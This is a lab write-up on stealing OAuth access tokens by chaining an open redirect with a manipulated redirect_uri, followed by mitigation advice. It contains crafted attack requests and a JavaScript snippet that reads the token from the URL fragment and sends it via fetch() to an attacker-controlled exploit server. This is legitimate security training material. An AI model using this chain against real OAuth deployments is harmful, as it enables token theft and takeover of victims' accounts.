# Lab 4: Stealing OAuth access tokens via an open redirect

## Description
The client application uses an OAuth flow returning tokens via URL fragments, but enforces strict host matching on `redirect_uri`. However, because the client application contains an **Open Redirect** vulnerability, an attacker can bypass `redirect_uri` validation, causing the OAuth token to leak via the URL fragment to an external attacker server.

## Exploitation Steps

1. **Locate the Open Redirect:**
   - Browse the target site and test redirect features (such as post comments or next page parameters).
   - Identify an open redirect parameter on the host domain:
     ```http
     GET /post/next?path=[https://exploit-server.net/](https://exploit-server.net/) HTTP/1.1
     Host: client-app.com
     ```

2. **Combine OAuth Request with Open Redirect:**
   - Craft a request where `redirect_uri` points to the open redirect endpoint via directory traversal or path manipulation:
     ```http
     GET /auth?client_id=CLIENT_ID&redirect_uri=[https://client-app.com/oauth-callback/../../post/next?path=https://exploit-server.net/log&response_type=token&scope=openid%20profile](https://client-app.com/oauth-callback/../../post/next?path=https://exploit-server.net/log&response_type=token&scope=openid%20profile) HTTP/1.1
     Host: oauth-server.net
     ```

3. **Build the Token Exfiltration Script:**
   - Go to the **Exploit Server** and host a script that extracts the token from `document.location.hash` and logs it to the server:
     ```html
     <script>
       if (window.location.hash) {
         fetch('[https://exploit-server.net/log?key=](https://exploit-server.net/log?key=)' + encodeURIComponent(window.location.hash));
       } else {
         window.location = "[https://oauth-server.net/auth?client_id=CLIENT_ID&redirect_uri=https://client-app.com/post/next?path=https://exploit-server.net/&response_type=token&scope=openid%20profile](https://oauth-server.net/auth?client_id=CLIENT_ID&redirect_uri=https://client-app.com/post/next?path=https://exploit-server.net/&response_type=token&scope=openid%20profile)";
       }
     </script>
     ```

4. **Extract Stolen Token:**
   - Click **Deliver exploit to victim**.
   - Check the **Access log** on the Exploit Server for the entry containing `#access_token=...`.
   - Use the extracted access token to fetch protected victim resources directly via API.

## Mitigation Strategies

- **Eliminate Open Redirects:** Enforce strict URL parsing and whitelisting on all application redirect paths.
- **Deprecate Implicit Grant:** Use the Authorization Code flow combined with **PKCE (Proof Key for Code Exchange)** instead of returning tokens directly in browser hash fragments.
- **Strict Full Path Validation:** Validate the complete `redirect_uri` path rather than relying only on host or prefix matching.
